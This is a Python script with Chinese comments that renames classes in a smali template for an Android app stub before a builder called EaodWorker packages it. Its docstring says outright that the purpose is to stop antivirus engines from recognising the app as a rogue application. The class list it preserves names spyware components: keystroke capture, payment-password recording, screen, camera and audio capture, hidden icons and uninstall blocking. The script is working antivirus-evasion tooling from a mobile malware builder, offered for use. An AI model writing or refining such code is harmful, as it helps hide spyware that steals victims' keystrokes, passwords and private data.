#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
randomize_stub.py  v2 (2025-04)
================================

apkstub 模板的【类名随机化】预处理脚本。

EaodWorker 内部已经处理 28 个敏感类的随机化（AccessServices/LiveChat/
BatteryHelper 等等），但漏掉了一批关键类（BootReceiver、BatteryOptimHelper、
MyJobService、MyWorker、ResetServices 等），这些类在最终 APK 里会保留原名，
是杀软识别"流氓应用"的最大特征。

本脚本补上这一段——只对 EaodWorker 不处理的类做随机化，保留：
  - 包路径 com/icontrol/protector（EaodWorker 内部硬编码，不能动）
  - Manifest 的 package / authority / permission（EaodWorker 自己会改）
  - EaodWorker 已知的类名（让它自己随机）

最后把改过的目录重新打包成 .zip 覆盖原 zip（EaodWorker 直接读 zip）。

用法：
    python randomize_stub.py --src <母版> --output-zip <输出zip路径> [--seed N]
"""

import os
import sys
import json
import shutil
import random
import string
import argparse
import glob
import re
import zipfile
import tempfile
from pathlib import Path

PKG_DOT = "com.icontrol.protector"
PKG_SLASH = "com/icontrol/protector"
PROTECTOR_DIR = "smali/com/icontrol/protector"

# EaodWorker 内部已经处理的 55+5 个类（保留原名，让 EaodWorker 自己随机）
# 这份清单从反编译 EaodWorker.dll Worker.cs 中所有 N_XXX 字段提取
EAOD_HANDLED = {
    "AccessibilityActivity", "AccessServices", "HiddenBrowser", "AccessTools",
    "ActivityCaptureScreen", "Apps_Manage", "ClassGen", "AudioRecorder",
    "CameraCap", "Contct_manager", "ActivityDraw", "My_Configs", "My_Crpter",
    "Deviceinfo", "KeyStorksQ", "LiveChat", "QueryChats", "LiveKeysStrok",
    "StarterServices", "LocationMonitor", "LockAppsActivity", "ActivMain",
    "MyLoger", "MyNotification", "MyPacket", "MySettings", "PermissionsActivity",
    "RecordPayPassWord", "RequestDraw", "MuteUninstall", "RequestPermissions2",
    "ScreenCaps", "ScreenReceiver", "StatusMonitor", "UtliTools",
    "NotifyListenService", "WorkServices", "BrodcastActivity", "OPPOAutostart",
    "RestrectionActivity", "HiddenActivity", "AnUninstall", "LockActivity",
    "EngineWorker", "TransparentActivity", "TransparentLauncherAlias",
    "SIMLauncherAlias", "ChromeLauncherAlias", "OppoLauncherAlias",
    "VivoLauncherAlias", "MuteActivity", "AlertActivity", "HiddenIco",
    "WebBrowser", "Webjector", "Class1", "Class2", "Class3", "Class4", "Class5",
    # 安全起见，把 EaodWorker 的关键字也排除（避免随机串撞车）
    "ActivityMonitors", "ChatActivity", "Codes", "Consts",
}


# ========== 工具函数 ==========

def gen_random_class_name(used: set, length: int = 8) -> str:
    """生成不重复的随机类名（首大写 + 7 个字母数字）"""
    while True:
        name = (random.choice(string.ascii_uppercase) +
                ''.join(random.choices(string.ascii_letters + string.digits, k=length - 1)))
        if name not in used and not name[0].isdigit():
            used.add(name)
            return name


def collect_target_classes(proto_dir: str) -> set:
    """
    扫描 protector 目录下所有 smali 文件，返回我们需要重命名的顶层类集合。
    （即 EaodWorker 不处理的那些类）
    """
    all_outer = set()
    for f in os.listdir(proto_dir):
        if not f.endswith('.smali'):
            continue
        name = f[:-6]
        outer = name.split('$', 1)[0] if '$' in name else name
        all_outer.add(outer)

    targets = all_outer - EAOD_HANDLED
    return targets, all_outer


def rename_smali_files(proto_dir: str, class_map: dict) -> int:
    """重命名 smali 文件（含内部类后缀）"""
    count = 0
    for f in sorted(os.listdir(proto_dir)):
        if not f.endswith('.smali'):
            continue
        name = f[:-6]
        if '$' in name:
            outer, suffix = name.split('$', 1)
            suffix = '$' + suffix
        else:
            outer, suffix = name, ''
        if outer in class_map:
            new_name = f"{class_map[outer]}{suffix}.smali"
            os.rename(os.path.join(proto_dir, f),
                      os.path.join(proto_dir, new_name))
            count += 1
    return count


def replace_class_refs(stub_dir: str, class_map: dict) -> tuple:
    """
    替换所有 smali 文件中的旧类引用：
      - Lcom/icontrol/protector/<old>;
      - Lcom/icontrol/protector/<old>$
      - "com.icontrol.protector.<old>"  (硬编码字符串)
      - 注释 # 里的旧类名
    """
    sorted_keys = sorted(class_map.keys(), key=len, reverse=True)
    prefix_slash = f"L{PKG_SLASH}/"
    prefix_dot = f'"{PKG_DOT}.'

    files_changed = 0
    total = 0

    for sf in glob.glob(f"{stub_dir}/smali/**/*.smali", recursive=True) + \
              glob.glob(f"{stub_dir}/smali_*/**/*.smali", recursive=True):
        try:
            with open(sf, encoding='utf-8', errors='ignore') as f:
                content = f.read()
        except Exception:
            continue
        if prefix_slash not in content and prefix_dot not in content and '#' not in content:
            continue

        original = content
        cnt = 0
        for old in sorted_keys:
            new = class_map[old]
            for boundary in (';', '$'):
                a, b = f"{prefix_slash}{old}{boundary}", f"{prefix_slash}{new}{boundary}"
                if a in content:
                    n = content.count(a)
                    content = content.replace(a, b)
                    cnt += n
            a2, b2 = f'"{PKG_DOT}.{old}"', f'"{PKG_DOT}.{new}"'
            if a2 in content:
                n = content.count(a2)
                content = content.replace(a2, b2)
                cnt += n

        # 处理注释中的旧类名（保守：只替换以 # 开头行里的整词）
        if '#' in content:
            new_lines = []
            for line in content.split('\n'):
                stripped = line.lstrip()
                if stripped.startswith('#'):
                    new_line = line
                    for old in sorted_keys:
                        new_line = re.sub(r'\b' + re.escape(old) + r'\b',
                                          class_map[old], new_line)
                    new_lines.append(new_line)
                else:
                    new_lines.append(line)
            content = '\n'.join(new_lines)

        if content != original:
            with open(sf, 'w', encoding='utf-8') as f:
                f.write(content)
            files_changed += 1
            total += cnt
    return files_changed, total


def update_manifest(manifest_path: str, class_map: dict) -> int:
    """
    更新 AndroidManifest.xml，只替换我们改过的那些类名。
    保留 package、authority、permission 不动（EaodWorker 自己处理）。
    """
    if not os.path.exists(manifest_path):
        return 0
    content = open(manifest_path, encoding='utf-8').read()
    sorted_keys = sorted(class_map.keys(), key=len, reverse=True)
    count = 0
    for old in sorted_keys:
        new = class_map[old]
        # 全限定名
        a = f'"{PKG_DOT}.{old}"'
        b = f'"{PKG_DOT}.{new}"'
        if a in content:
            count += content.count(a)
            content = content.replace(a, b)
        # 短名 ".XXX"
        pat = re.compile(r'"\.' + re.escape(old) + r'"')
        new_content, n = pat.subn(f'".{class_map[old]}"', content)
        content = new_content
        count += n
    open(manifest_path, 'w', encoding='utf-8').write(content)
    return count


def cleanup_build_cache(stub_dir: str):
    """删除 build/ 缓存（apktool 用，可能影响打包）"""
    bd = os.path.join(stub_dir, 'build')
    if os.path.isdir(bd):
        shutil.rmtree(bd)


def zip_directory(src_dir: str, output_zip: str) -> int:
    """把目录重新打包成 zip"""
    # 写到临时文件再原子替换，防止中途失败破坏原 zip
    tmp = output_zip + '.tmp'
    with zipfile.ZipFile(tmp, 'w', zipfile.ZIP_DEFLATED, compresslevel=6) as zf:
        for root, dirs, files in os.walk(src_dir):
            # 计算 zip 内的相对路径
            for fn in files:
                full = os.path.join(root, fn)
                arc = os.path.relpath(full, src_dir).replace(os.sep, '/')
                zf.write(full, arc)
    if os.path.exists(output_zip):
        os.replace(tmp, output_zip)
    else:
        os.rename(tmp, output_zip)
    return os.path.getsize(output_zip)


# ========== 主入口 ==========

def randomize_stub(src: str, output_zip: str = None, workdir: str = None,
                   seed: int = None, verbose: bool = True) -> dict:
    if seed is not None:
        random.seed(seed)

    if not os.path.exists(src):
        raise FileNotFoundError(f"母版不存在: {src}")

    # 工作目录
    own_workdir = False
    if workdir is None:
        workdir = tempfile.mkdtemp(prefix='apkstub_rand_')
        own_workdir = True
    elif os.path.exists(workdir):
        shutil.rmtree(workdir)

    # 支持 src 是目录或 zip
    if os.path.isfile(src) and src.lower().endswith('.zip'):
        if verbose:
            print(f"[1/6] 解压母版 zip → {workdir}", file=sys.stderr)
        os.makedirs(workdir, exist_ok=True)
        with zipfile.ZipFile(src, 'r') as zf:
            zf.extractall(workdir)
    elif os.path.isdir(src):
        if verbose:
            print(f"[1/6] 复制母版目录 → {workdir}", file=sys.stderr)
        shutil.copytree(src, workdir)
    else:
        raise ValueError(f"--src 必须是目录或 .zip 文件: {src}")

    proto_dir = os.path.join(workdir, *PROTECTOR_DIR.split('/'))
    if not os.path.isdir(proto_dir):
        raise FileNotFoundError(f"母版中找不到 protector 包: {proto_dir}")

    # 确定要重命名的类
    targets, all_outer = collect_target_classes(proto_dir)
    if verbose:
        print(f"[2/6] stub 共 {len(all_outer)} 个顶层类，"
              f"EaodWorker 不管的 {len(targets)} 个待重命名", file=sys.stderr)

    # 生成映射
    used = set()
    class_map = {old: gen_random_class_name(used) for old in sorted(targets)}

    # 重命名 smali 文件
    if verbose:
        print(f"[3/6] 重命名 smali 文件", file=sys.stderr)
    rename_smali_files(proto_dir, class_map)

    # 替换所有引用
    if verbose:
        print(f"[4/6] 替换所有 smali 中的类引用", file=sys.stderr)
    files_a, refs_a = replace_class_refs(workdir, class_map)
    if verbose:
        print(f"      {files_a} 个文件，{refs_a} 处引用", file=sys.stderr)

    # 更新 Manifest
    if verbose:
        print(f"[5/6] 更新 AndroidManifest.xml", file=sys.stderr)
    manifest_path = os.path.join(workdir, 'AndroidManifest.xml')
    n_manifest = update_manifest(manifest_path, class_map)

    # 清理 build 缓存
    cleanup_build_cache(workdir)

    summary = {
        'src': src,
        'workdir': workdir,
        'output_zip': output_zip,
        'seed': seed,
        'class_count_total': len(all_outer),
        'class_count_renamed': len(class_map),
        'class_count_eaod_handled': len(all_outer) - len(class_map),
        'class_map': class_map,
        'manifest_changes': n_manifest,
    }

    # 打包成 zip
    if output_zip:
        if verbose:
            print(f"[6/6] 重新打包成 {output_zip}", file=sys.stderr)
        size = zip_directory(workdir, output_zip)
        summary['output_zip_size'] = size

    # 工作目录如果是临时建的，清理掉
    if own_workdir and output_zip:
        try:
            shutil.rmtree(workdir)
            summary['workdir_cleaned'] = True
        except Exception:
            pass

    # 摘要写到副本根目录（如果 workdir 还在）
    if os.path.isdir(workdir):
        with open(os.path.join(workdir, '_randomize_summary.json'), 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)

    return summary


def main():
    parser = argparse.ArgumentParser(description='apkstub 类名随机化（v2）')
    parser.add_argument('--src', required=True, help='母版目录')
    parser.add_argument('--output-zip', help='输出 zip 路径（如 apkstub.zip）')
    parser.add_argument('--workdir', help='工作目录路径（不指定则用临时目录）')
    parser.add_argument('--seed', type=int, default=None, help='随机种子')
    parser.add_argument('--quiet', action='store_true', help='不输出进度')
    args = parser.parse_args()

    if not args.output_zip and not args.workdir:
        print(json.dumps({'success': False,
                          'error': 'must specify --output-zip or --workdir'}), file=sys.stderr)
        return 1

    try:
        summary = randomize_stub(
            src=args.src,
            output_zip=args.output_zip,
            workdir=args.workdir,
            seed=args.seed,
            verbose=not args.quiet,
        )
        print(json.dumps({
            'success': True,
            'class_count_total': summary['class_count_total'],
            'class_count_renamed': summary['class_count_renamed'],
            'class_count_eaod_handled': summary['class_count_eaod_handled'],
            'output_zip': summary.get('output_zip'),
            'output_zip_size': summary.get('output_zip_size'),
        }, ensure_ascii=False))
        return 0
    except Exception as e:
        import traceback
        print(json.dumps({'success': False, 'error': str(e),
                          'traceback': traceback.format_exc()}), file=sys.stderr)
        return 1


if __name__ == '__main__':
    sys.exit(main())
